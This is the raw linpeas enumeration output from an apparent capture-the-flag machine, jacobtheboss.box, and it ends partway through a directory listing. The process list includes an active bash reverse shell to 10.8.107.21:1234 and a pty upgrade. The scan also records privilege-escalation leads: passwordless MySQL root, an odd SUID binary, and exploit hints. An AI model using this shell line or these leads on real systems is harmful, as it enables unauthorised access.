@@ -1,0 +1,1534 @@
+====================================( Basic information )=====================================
+OS: Linux version 3.10.0-1127.18.2.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-39) (GCC) ) #1 SMP Sun Jul 26 15:27:06 UTC 2020
+User & Groups: uid=1001(jacob) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
+Hostname: jacobtheboss.box
+Writable folder: /dev/shm
+[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[-] No port scan capabilities (nc not found)
+
+
+Caching directories . . . . . . . . . . . . . . . . . . . . DONE
+====================================( System Information )====================================
+[+] Operative system
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
+Linux version 3.10.0-1127.18.2.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-39) (GCC) ) #1 SMP Sun Jul 26 15:27:06 UTC 2020
+
+[+] Sudo version
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
+Sudo version 1.8.23
+
+[+] PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#usdpath
+/sbin:/bin:/usr/sbin:/usr/bin
+New path exported: /sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin
+
+[+] Date
+Thu Sep 10 16:05:35 UTC 2020
+
+[+] System stats
+Filesystem      Size  Used Avail Use% Mounted on
+devtmpfs        911M     0  911M   0% /dev
+tmpfs           919M  224K  918M   1% /dev/shm
+tmpfs           919M  8.6M  910M   1% /run
+tmpfs           919M     0  919M   0% /sys/fs/cgroup
+/dev/xvda1       40G  4.1G   36G  11% /
+tmpfs           184M     0  184M   0% /run/user/1001
+tmpfs           184M     0  184M   0% /run/user/0
+              total        used        free      shared  buff/cache   available
+Mem:        1880312      921404      689712        9008      269196      796036
+Swap:             0           0           0
+
+[+] Environment
+[i] Any private information inside environment variables?
+XDG_SESSION_ID=c1
+TERM=unknown
+SHELL=/bin/bash
+HISTSIZE=0
+JBOSS_HOME=/srv/jboss
+HISTFILESIZE=0
+USER=jacob
+LD_LIBRARY_PATH=/srv/java/jre/lib/amd64/server:/srv/java/jre/lib/amd64:/srv/java/jre/../lib/amd64
+SUDO_USER=root
+SUDO_UID=0
+USERNAME=jacob
+NLSPATH=/usr/dt/lib/nls/msg/%L/%N.cat
+PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin
+MAIL=/var/mail/jacob
+LANG=en_US.UTF-8
+XFILESEARCHPATH=/usr/dt/app-defaults/%L/Dt
+SHLVL=5
+SUDO_COMMAND=/bin/sh /srv/jboss/bin/run.sh -b jacobtheboss.box
+HOME=/home/jacob
+LOGNAME=jacob
+LESSOPEN=||/usr/bin/lesspipe.sh %s
+XDG_RUNTIME_DIR=/run/user/1001
+SUDO_GID=0
+HISTFILE=/dev/null
+_=/bin/env
+
+[+] Looking for Signature verification failed in dmseg
+ Not Found
+
+[+] AppArmor enabled? .............. AppArmor Not Found
+[+] grsecurity present? ............ grsecurity Not Found
+[+] PaX bins present? .............. PaX Not Found
+[+] Execshield enabled? ............ Execshield Not Found
+[+] SELinux enabled? ............... SELinux status:                 enabled
+SELinuxfs mount:                /sys/fs/selinux
+SELinux root directory:         /etc/selinux
+Loaded policy name:             targeted
+Current mode:                   permissive
+Mode from config file:          permissive
+Policy MLS status:              enabled
+Policy deny_unknown status:     allowed
+Max kernel policy version:      31
+[+] Is ASLR enabled? ............... Yes
+[+] Printer? ....................... lpstat Not Found
+[+] Is this a container? ........... No
+
+
+=========================================( Devices )==========================================
+[+] Any sd* disk in /dev? (limit 20)
+
+[+] Unmounted file-system?
+[i] Check if you can mount umounted devices
+
+UUID=8ac075e3-1124-4bb6-bef7-a6811bf8b870	/	xfs	defaults	0 0
+
+
+====================================( Available Software )====================================
+[+] Useful software
+/bin/wget
+/bin/curl
+/bin/ping
+/bin/gcc
+/bin/g++
+/bin/make
+/bin/base64
+/bin/python
+/bin/python2
+/bin/python2.7
+/bin/perl
+/bin/php
+/bin/sudo
+
+[+] Installed Compiler
+gcc.x86_64                            4.8.5-39.el7                         @base
+gcc-c++.x86_64                        4.8.5-39.el7                         @base
+/bin/gcc
+/bin/g++
+
+
+================================( Processes, Cron, Services, Timers & Sockets )================================
+[+] Cleaned processes
+[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+apache    1201  0.0  0.5 443232 10228 ?        S    15:24   0:00 /usr/sbin/httpd -DFOREGROUND
+apache    1202  0.0  0.7 549272 14728 ?        S    15:24   0:00 /usr/sbin/httpd -DFOREGROUND
+apache    1203  0.0  0.6 443368 11772 ?        S    15:24   0:00 /usr/sbin/httpd -DFOREGROUND
+apache    1204  0.0  0.7 549272 14728 ?        S    15:24   0:00 /usr/sbin/httpd -DFOREGROUND
+apache    1205  0.0  0.5 443232 10228 ?        S    15:24   0:00 /usr/sbin/httpd -DFOREGROUND
+apache    1303  0.0  0.5 443232  9488 ?        S    15:25   0:00 /usr/sbin/httpd -DFOREGROUND
+apache    1305  0.0  0.5 443232  9488 ?        S    15:25   0:00 /usr/sbin/httpd -DFOREGROUND
+apache    1306  0.0  0.5 443232  9488 ?        S    15:25   0:00 /usr/sbin/httpd -DFOREGROUND
+apache    1307  0.0  0.5 443232  9488 ?        S    15:25   0:00 /usr/sbin/httpd -DFOREGROUND
+chrony     322  0.0  0.0 117808  1732 ?        S    15:24   0:00 /usr/sbin/chronyd
+dbus       319  0.0  0.1  66472  2540 ?        Ssl  15:24   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
+jacob     1091  1.8 36.0 1812968 677140 ?      Sl   15:24   0:46 /srv/java/bin/java -Dprogram.name=run.sh -server -Xms128m -Xmx512m -XX:MaxPermSize=256m -Dorg.jboss.resolver.warning=true -Dsun.rmi.dgc.client.gcInterval=3600000 -Dsun.rmi.dgc.server.gcInterval=3600000 -Djava.net.preferIPv4Stack=true -Djava.endorsed.dirs=/srv/jboss/lib/endorsed -classpath /srv/jboss/bin/run.jar:/srv/java/lib/tools.jar org.jboss.Main -b jacobtheboss.box
+jacob     1361  0.0  0.0 113288  1204 ?        S    15:55   0:00 /bin/bash -c /bin/bash${IFS}-i>&/dev/tcp/10.8.107.21/1234<&1
+jacob     1362  0.0  0.1 116076  2460 ?        S    15:55   0:00 /bin/bash -i
+jacob     1375  0.0  0.2 129724  4760 ?        S    15:56   0:00 python -c import pty; pty.spawn("/bin/bash")
+jacob     1376  0.0  0.1 116088  2572 pts/0    Ss   15:56   0:00 /bin/bash
+jacob     1434  0.2  0.1 113688  2044 pts/0    S+   16:05   0:00 /bin/sh ./linpeas.sh
+jacob     1927  0.0  0.0 155476  1860 pts/0    R+   16:05   0:00 ps aux
+jacob     1929  0.0  0.0 116604   916 pts/0    S+   16:05   0:00 sort
+jacob      737  0.0  0.0 113288  1468 ?        S    15:24   0:00 sh /srv/jboss/bin/run.sh -b jacobtheboss.box
+mysql      783  0.0  0.0 113416  1588 ?        Ss   15:24   0:00 /bin/sh /usr/bin/mysqld_safe --basedir=/usr
+mysql      986  0.0  5.0 971048 94816 ?        Sl   15:24   0:00 /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib64/mysql/plugin --log-error=/var/log/mariadb/mariadb.log --pid-file=/var/run/mariadb/mariadb.pid --socket=/var/lib/mysql/mysql.sock
+polkitd    317  0.0  0.6 612248 12116 ?        Ssl  15:24   0:00 /usr/lib/polkit-1/polkitd --no-debug
+postfix    974  0.0  0.2  89808  4056 ?        S    15:24   0:00 pickup -l -t unix -u
+postfix    975  0.0  0.2  89876  4076 ?        S    15:24   0:00 qmgr -l -t unix -u
+root         1  0.1  0.3 128020  6592 ?        Ss   15:23   0:02 /usr/lib/systemd/systemd --switched-root --system --deserialize 21
+root      1425  0.0  0.0 123364   724 ?        Ss   16:01   0:00 /usr/sbin/anacron -s
+root       230  0.0  0.1  39080  2584 ?        Ss   15:24   0:00 /usr/lib/systemd/systemd-journald
+root       268  0.0  0.2  48416  5444 ?        Ss   15:24   0:00 /usr/lib/systemd/systemd-udevd
+root       282  0.0  0.0  55532   856 ?        S<sl 15:24   0:00 /sbin/auditd
+root       324  0.0  0.0 195208  1248 ?        Ssl  15:24   0:00 /usr/sbin/gssproxy -D
+root       390  0.0  0.5 474108 10184 ?        Ssl  15:24   0:00 /usr/sbin/NetworkManager --no-daemon
+root       393  0.0  0.0  26384  1760 ?        Ss   15:24   0:00 /usr/lib/systemd/systemd-logind
+root       401  0.0  0.0 126388  1664 ?        Ss   15:24   0:00 /usr/sbin/crond -n
+root       622  0.0  0.1 102904  2768 ?        Ss   15:24   0:00 /sbin/dhclient -1 -q -lf /var/lib/dhclient/dhclient--eth0.lease -pf /var/run/dhclient-eth0.pid -H jacobtheboss eth0
+root       679  0.0  0.9 443232 17464 ?        Ss   15:24   0:00 /usr/sbin/httpd -DFOREGROUND
+root       680  0.0  0.0 115408  1432 ?        Ss   15:24   0:00 /bin/bash /root/jboss.sh
+root       682  0.0  0.2 112924  4308 ?        Ss   15:24   0:00 /usr/sbin/sshd -D -u0
+root       683  0.0  0.2 243380  4616 ?        S    15:24   0:00 sudo -u jacob sh /srv/jboss/bin/run.sh -b jacobtheboss.box
+root       685  0.0  0.4 216424  9312 ?        Ssl  15:24   0:00 /usr/sbin/rsyslogd -n
+root       689  0.0  0.9 574308 17432 ?        Ssl  15:24   0:00 /usr/bin/python2 -Es /usr/sbin/tuned -l -P
+root       693  0.0  0.0 110208   860 ttyS0    Ss+  15:24   0:00 /sbin/agetty --keep-baud 115200,38400,9600 ttyS0 vt220
+root       694  0.0  0.0 110208   856 tty1     Ss+  15:24   0:00 /sbin/agetty --noclear tty1 linux
+root       935  0.0  0.1  89704  2124 ?        Ss   15:24   0:00 /usr/libexec/postfix/master -w
+rpc        403  0.0  0.0  69280  1000 ?        Ss   15:24   0:00 /sbin/rpcbind -w
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+
+[+] Binary processes permissions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+-rwxr-xr-x. 1 root  root    964536 Apr  1 02:17 /bin/bash
+lrwxrwxrwx. 1 root  root         4 Jul 30 21:30 /bin/sh -> bash
+-rwxr-xr-x. 1 root  root     49640 Apr  1 04:51 /sbin/agetty
+-rwxr-xr-x. 1 root  root    128664 Aug  8  2019 /sbin/auditd
+-rwxr-xr-x. 1 root  root    424280 Apr  2 13:29 /sbin/dhclient
+-rwxr-xr-x. 1 root  root     61512 Apr  1 04:19 /sbin/rpcbind
+-rwxr-xr-x. 1 jacob jacob    66328 Oct  9  2009 /srv/java/bin/java
+-rwxr-xr-x. 1 root  root    223232 Jul 13 14:23 /usr/bin/dbus-daemon
+lrwxrwxrwx. 1 root  root         9 Jul 30 21:31 /usr/bin/python2 -> python2.7
+-rwxr-xr-x. 1 root  root  14307472 Apr  2 17:53 /usr/libexec/mysqld
+-rwxr-xr-x. 1 root  root    172496 Apr  1 04:09 /usr/libexec/postfix/master
+-rwxr-xr-x. 1 root  root    120432 Apr  1 04:07 /usr/lib/polkit-1/polkitd
+-rwxr-xr-x. 1 root  root   1628544 Jun 30 15:11 /usr/lib/systemd/systemd
+-rwxr-xr-x. 1 root  root    346144 Jun 30 15:11 /usr/lib/systemd/systemd-journald
+-rwxr-xr-x. 1 root  root    635728 Jun 30 15:11 /usr/lib/systemd/systemd-logind
+-rwxr-xr-x. 1 root  root    416192 Jun 30 15:11 /usr/lib/systemd/systemd-udevd
+-rwxr-xr-x. 1 root  root     36448 Aug  8  2019 /usr/sbin/anacron
+-rwxr-xr-x. 1 root  root    269392 Aug  8  2019 /usr/sbin/chronyd
+-rwxr-xr-x. 1 root  root     70216 Aug  8  2019 /usr/sbin/crond
+-rwxr-xr-x. 1 root  root    133744 Apr  1 02:45 /usr/sbin/gssproxy
+-rwxr-xr-x. 1 root  root    523608 Apr  2 13:14 /usr/sbin/httpd
+-rwxr-xr-x. 1 root  root   2958896 Apr  1 03:57 /usr/sbin/NetworkManager
+-rwxr-xr-x. 1 root  root    664024 Jun 23 15:40 /usr/sbin/rsyslogd
+-rwxr-xr-x. 1 root  root    852856 Aug  9  2019 /usr/sbin/sshd
+
+[+] Cron jobs
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs
+-rw-------. 1 root root   0 Aug  8  2019 /etc/cron.deny
+-rw-r--r--. 1 root root 451 Jun  9  2014 /etc/crontab
+
+/etc/cron.d:
+total 16
+drwxr-xr-x.  2 root root   21 Jul 30 21:31 .
+drwxr-xr-x. 85 root root 8192 Sep 10 15:24 ..
+-rw-r--r--.  1 root root  128 Aug  8  2019 0hourly
+
+/etc/cron.daily:
+total 20
+drwxr-xr-x.  2 root root   42 Jul 30 21:31 .
+drwxr-xr-x. 85 root root 8192 Sep 10 15:24 ..
+-rwx------.  1 root root  219 Apr  1 03:26 logrotate
+-rwxr-xr-x.  1 root root  618 Oct 30  2018 man-db.cron
+
+/etc/cron.hourly:
+total 16
+drwxr-xr-x.  2 root root   22 Jul 30 21:31 .
+drwxr-xr-x. 85 root root 8192 Sep 10 15:24 ..
+-rwxr-xr-x.  1 root root  392 Aug  8  2019 0anacron
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x.  2 root root    6 Jun  9  2014 .
+drwxr-xr-x. 85 root root 8192 Sep 10 15:24 ..
+
+/etc/cron.weekly:
+total 12
+drwxr-xr-x.  2 root root    6 Jun  9  2014 .
+drwxr-xr-x. 85 root root 8192 Sep 10 15:24 ..
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+
+
+
+[+] Services
+[i] Search for outdated versions
+netconsole module not loaded
+Configured devices:
+lo eth0
+Currently active devices:
+lo eth0
+
+[+] Systemd PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+
+[+] Analyzing .service files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
+You can't write on systemd PATH so I'm not going to list relative paths executed by services
+
+[+] System timers
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+NEXT                         LEFT     LAST                         PASSED    UNIT                         ACTIVATES
+Fri 2020-09-11 15:39:02 UTC  23h left Thu 2020-09-10 15:39:02 UTC  26min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+n/a                          n/a      n/a                          n/a       systemd-readahead-done.timer systemd-readahead-done.service
+
+[+] Analyzing .timer files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+
+[+] Analyzing .socket files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] HTTP sockets
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] D-Bus config files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+
+
+===================================( Network Information )====================================
+[+] Hostname, hosts and DNS
+jacobtheboss.box
+127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
+::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
+; generated by /usr/sbin/dhclient-script
+search eu-west-1.compute.internal box
+nameserver 10.0.0.2
+box
+
+[+] Content of /etc/inetd.conf & /etc/xinetd.conf
+/etc/inetd.conf Not Found
+
+[+] Networks and neighbours
+default 0.0.0.0
+loopback 127.0.0.0
+link-local 169.254.0.0
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 02:87:09:b7:62:b3 brd ff:ff:ff:ff:ff:ff
+    inet 10.10.91.18/16 brd 10.10.255.255 scope global dynamic eth0
+       valid_lft 2698sec preferred_lft 2698sec
+    inet6 fe80::87:9ff:feb7:62b3/64 scope link 
+       valid_lft forever preferred_lft forever
+10.10.0.1 dev eth0 lladdr 02:c8:85:b5:5a:aa REACHABLE
+
+[+] Iptables rules
+iptables rules Not Found
+
+[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports
+
+[+] Can I sniff with tcpdump?
+No
+
+
+====================================( Users Information )=====================================
+[+] My user
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups
+uid=1001(jacob) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
+
+[+] Do I have PGP keys?
+
+[+] Clipboard or highlighted text?
+xsel and xclip Not Found
+
+[+] Testing 'sudo -l' without password & /etc/sudoers
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
+
+[+] Checking /etc/doas.conf
+/etc/doas.conf Not Found
+
+[+] Checking Pkexec policy
+
+[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
+[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+
+[+] Superusers
+root:x:0:0:root:/root:/bin/bash
+
+[+] Users with console
+jacob:x:1001:1001::/home/jacob:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+
+[+] All users & groups
+uid=0(root) gid=0(root) groups=0(root)
+uid=1001(jacob) gid=1001(jacob) groups=1001(jacob)
+uid=11(operator) gid=0(root) groups=0(root)
+uid=12(games) gid=100(users) groups=100(users)
+uid=14(ftp) gid=50(ftp) groups=50(ftp)
+uid=192(systemd-network) gid=192(systemd-network) groups=192(systemd-network)
+uid=1(bin) gid=1(bin) groups=1(bin)
+uid=27(mysql) gid=27(mysql) groups=27(mysql)
+uid=29(rpcuser) gid=29(rpcuser) groups=29(rpcuser)
+uid=2(daemon) gid=2(daemon) groups=2(daemon)
+uid=32(rpc) gid=32(rpc) groups=32(rpc)
+uid=3(adm) gid=4(adm) groups=4(adm)
+uid=48(apache) gid=48(apache) groups=48(apache)
+uid=4(lp) gid=7(lp) groups=7(lp)
+uid=59(tss) gid=59(tss) groups=59(tss)
+uid=5(sync) gid=0(root) groups=0(root)
+uid=65534(nfsnobody) gid=65534(nfsnobody) groups=65534(nfsnobody)
+uid=6(shutdown) gid=0(root) groups=0(root)
+uid=74(sshd) gid=74(sshd) groups=74(sshd)
+uid=7(halt) gid=0(root) groups=0(root)
+uid=81(dbus) gid=81(dbus) groups=81(dbus)
+uid=89(postfix) gid=89(postfix) groups=89(postfix),12(mail)
+uid=8(mail) gid=12(mail) groups=12(mail)
+uid=998(chrony) gid=995(chrony) groups=995(chrony)
+uid=999(polkitd) gid=998(polkitd) groups=998(polkitd)
+uid=99(nobody) gid=99(nobody) groups=99(nobody)
+
+[+] Login now
+ 16:05:50 up 41 min,  0 users,  load average: 0.21, 0.06, 0.06
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+[+] Last logons
+vagrant  pts/0        10.0.2.2         Thu Jul 30 22:00 - 22:01  (00:00)    
+reboot   system boot  3.10.0-1127.18.2 Thu Jul 30 22:00 - 22:16  (00:16)    
+vagrant  pts/0        10.0.2.2         Thu Jul 30 21:57 - 21:59  (00:02)    
+reboot   system boot  3.10.0-1127.18.2 Thu Jul 30 21:56 - 21:59  (00:03)    
+vagrant  pts/0        10.0.2.2         Thu Jul 30 21:47 - 21:56  (00:08)    
+reboot   system boot  3.10.0-1127.18.2 Thu Jul 30 21:42 - 21:59  (00:17)    
+vagrant  pts/0        10.0.2.2         Thu Jul 30 21:26 - 21:42  (00:15)    
+reboot   system boot  3.10.0-957.12.2. Thu Jul 30 21:25 - 21:42  (00:16)    
+
+wtmp begins Thu Jul 30 21:25:31 2020
+
+[+] Last time logon each user
+Username         Port     From             Latest
+root             pts/0    192.168.150.1    Fri Jul 31 18:44:47 +0000 2020
+
+[+] Password policy
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD MD5
+
+
+===================================( Software Information )===================================
+[+] MySQL version
+mysql  Ver 15.1 Distrib 5.5.65-MariaDB, for Linux (x86_64) using readline 5.1
+
+[+] MySQL connection using default root/root ........... No
+[+] MySQL connection using root/toor ................... No
+[+] MySQL connection using root/NOPASS ................. Yes
+User	Host	authentication_string
+root	localhost	
+root	boss	
+root	127.0.0.1	
+root	::1	
+	localhost	
+	boss	
+[+] Looking for mysql credentials and exec
+From '/usr/share/mysql/my-huge.cnf' Mysql user: 
+From '/usr/share/mysql/my-innodb-heavy-4G.cnf' Mysql user: 
+From '/usr/share/mysql/my-large.cnf' Mysql user: 
+From '/usr/share/mysql/my-medium.cnf' Mysql user: 
+
+[+] PostgreSQL version and pgadmin credentials
+ Not Found
+
+[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
+[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No
+
+[+] Apache server info
+Version: Server version: Apache/2.4.6 (CentOS)
+Server built:   Apr  2 2020 13:13:23
+PHP exec extensions
+
+[+] Looking for PHPCookies
+ Not Found
+
+[+] Looking for Wordpress wp-config.php files
+wp-config.php Not Found
+
+[+] Looking for Drupal settings.php files
+/default/settings.php Not Found
+
+[+] Looking for Tomcat users file
+tomcat-users.xml Not Found
+
+[+] Mongo information
+ Not Found
+
+[+] Looking for supervisord configuration file
+supervisord.conf Not Found
+
+[+] Looking for cesi configuration file
+cesi.conf Not Found
+
+[+] Looking for Rsyncd config file
+/etc/rsyncd.conf
+
+[+] Looking for Hostapd config file
+hostapd.conf Not Found
+
+[+] Looking for wifi conns file
+/etc/NetworkManager/system-connections/
+
+[+] Looking for Anaconda-ks config files
+anaconda-ks.cfg Not Found
+
+[+] Looking for .vnc directories and their passwd files
+.vnc Not Found
+
+[+] Looking for ldap directories and their hashes
+ldap Not Found
+
+[+] Looking for .ovpn files and credentials
+.ovpn Not Found
+
+[+] Looking for ssl/ssh files
+  --> Some certificates were found (out limited):
+/etc/pki/ca-trust/extracted/pem/objsign-ca-bundle.pem
+/etc/pki/ca-trust/source/ca-bundle.legacy.crt
+/etc/vmware-tools/GuestProxyData/server/cert.pem
+/usr/lib64/python2.7/config
+
+ --> /etc/hosts.allow file found, read the rules:
+
+
+
+Looking inside /etc/ssh/ssh_config for interesting info
+Host *
+	GSSAPIAuthentication yes
+	ForwardX11Trusted yes
+	SendEnv LANG LC_CTYPE LC_NUMERIC LC_TIME LC_COLLATE LC_MONETARY LC_MESSAGES
+	SendEnv LC_PAPER LC_NAME LC_ADDRESS LC_TELEPHONE LC_MEASUREMENT
+	SendEnv LC_IDENTIFICATION LC_ALL LANGUAGE
+	SendEnv XMODIFIERS
+
+[+] Looking for unexpected auth lines in /etc/pam.d/sshd
+auth	   required	pam_sepermit.so
+auth       substack     password-auth
+auth       include      postlogin
+-auth      optional     pam_reauthorize.so prepare
+account    include      password-auth
+password   include      password-auth
+session    include      password-auth
+-session   optional     pam_reauthorize.so prepare
+
+[+] Looking for Cloud credentials (AWS, Azure, GC)
+
+[+] NFS exports?
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+/etc/exports Not Found
+
+[+] Looking for kerberos conf files and tickets
+[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
+ default_ccache_name = KEYRING:persistent:%{uid}
+tickets kerberos Not Found
+klist Not Found
+
+[+] Looking for Kibana yaml
+kibana.yml Not Found
+
+[+] Looking for Knock configuration
+Knock.config Not Found
+
+[+] Looking for logstash files
+ Not Found
+
+[+] Looking for elasticsearch files
+ Not Found
+
+[+] Looking for Vault-ssh files
+vault-ssh-helper.hcl Not Found
+
+[+] Looking for AD cached hashes
+cached hashes Not Found
+
+[+] Looking for screen sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+screen Not Found
+
+[+] Looking for tmux sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+tmux Not Found
+
+[+] Looking for Couchdb directory
+
+[+] Looking for redis.conf
+
+[+] Looking for dovecot files
+dovecot credentials Not Found
+
+[+] Looking for mosquitto.conf
+
+[+] Looking for neo4j auth file
+
+[+] Looking Cloud-Init conf file
+
+[+] Looking Erlang cookie file
+
+
+====================================( Interesting Files )=====================================
+[+] SUID - Check easy privesc, exploits and write perms
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
+/usr/bin/pingsys
+/usr/bin/fusermount
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/chfn		--->	SuSE_9.3/10
+/usr/bin/newgrp		--->	HP-UX_10.20
+/usr/bin/chsh
+/usr/bin/sudo		--->	/sudo$
+/usr/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+/usr/bin/chage
+/usr/bin/umount		--->	BSD/Linux(08-1996)
+/usr/bin/crontab
+/usr/bin/pkexec		--->	Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+/usr/sbin/pam_timestamp_check
+/usr/sbin/unix_chkpwd
+/usr/sbin/usernetctl
+/usr/sbin/mount.nfs
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/libexec/dbus-1/dbus-daemon-launch-helper
+
+[+] SGID
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
+/usr/bin/wall
+/usr/bin/write
+/usr/bin/ssh-agent
+/usr/sbin/netreport
+/usr/sbin/postdrop
+/usr/sbin/postqueue
+/usr/libexec/utempter/utempter
+/usr/libexec/openssh/ssh-keysign
+
+[+] Writable folders configured in /etc/ld.so.conf.d/
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#etc-ld-so-conf-d
+/usr/lib64//bind9-export/
+/usr/lib64/mysql
+
+[+] Capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+/usr/bin/newgidmap = cap_setgid+ep
+/usr/bin/newuidmap = cap_setuid+ep
+/usr/sbin/arping = cap_net_raw+p
+/usr/sbin/clockdiff = cap_net_raw+p
+/usr/sbin/suexec = cap_setgid,cap_setuid+ep
+
+[+] Users with capabilities
+/etc/security/capability.conf Not Found
+
+[+] Files with ACLs
+files with acls in searched folders Not Found
+
+[+] .sh files in path
+/usr/bin/gettext.sh
+/usr/bin/setup-nsssysinit.sh
+/usr/bin/lesspipe.sh
+/usr/bin/rescan-scsi-bus.sh
+
+[+] Unexpected folders in root
+
+[+] Files (scripts) in /etc/profile.d/
+total 84
+drwxr-xr-x.  2 root root 4096 Jul 30 21:34 .
+drwxr-xr-x. 85 root root 8192 Sep 10 15:24 ..
+-rw-r--r--.  1 root root  771 Apr  1 02:50 256term.csh
+-rw-r--r--.  1 root root  841 Apr  1 02:50 256term.sh
+-rw-r--r--.  1 root root  660 Apr  1 02:15 bash_completion.sh
+-rw-r--r--.  1 root root  196 Mar 24  2017 colorgrep.csh
+-rw-r--r--.  1 root root  201 Mar 24  2017 colorgrep.sh
+-rw-r--r--.  1 root root 1741 Aug  6  2019 colorls.csh
+-rw-r--r--.  1 root root 1606 Aug  6  2019 colorls.sh
+-rw-r--r--.  1 root root   80 Apr  1 04:29 csh.local
+-rw-r--r--.  1 root root 1706 Apr  1 02:50 lang.csh
+-rw-r--r--.  1 root root 2703 Apr  1 02:50 lang.sh
+-rw-r--r--.  1 root root  123 Jul 30  2015 less.csh
+-rw-r--r--.  1 root root  121 Jul 30  2015 less.sh
+-rw-r--r--.  1 root root   81 Apr  1 04:29 sh.local
+-rw-r--r--.  1 root root  105 Aug  9  2019 vim.csh
+-rw-r--r--.  1 root root  269 Aug  9  2019 vim.sh
+-rw-r--r--.  1 root root  164 Jan 27  2014 which2.csh
+-rw-r--r--.  1 root root  169 Jan 27  2014 which2.sh
+
+[+] Hashes inside passwd file? ........... No
+[+] Hashes inside group file? ............ No
+[+] Credentials in fstab/mtab? ........... No
+[+] Can I read shadow files? ............. No
+[+] Can I read root folder? .............. No
+
+[+] Looking for root files in home dirs (limit 20)
+/home
+
+[+] Looking for others files in folders owned by me
+
+[+] Readable files belonging to root and readable by me but not world readable
+
+[+] Modified interesting files in the last 5mins (limit 100)
+/var/log/messages
+/var/log/secure
+/var/log/cron
+/tmp/hsperfdata_jacob/1091
+/home/jacob/.gnupg/gpg.conf
+/home/jacob/.gnupg/pubring.gpg
+/home/jacob/.gnupg/trustdb.gpg
+/srv/jboss/server/default/log/server.log
+/srv/jboss/server/default/data/hypersonic/localDB.lck
+
+[+] Writable log files (logrotten) (limit 100)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
+#)You_can_write_more_log_files_inside_last_directory
+Writable: /srv/jboss/server/default/log/boot.log
+Writable: /srv/jboss/server/default/log/server.log
+Writable: /srv/jboss/server/default/data/hypersonic/localDB.log
+
+[+] Files inside /home/jacob (limit 20)
+total 16
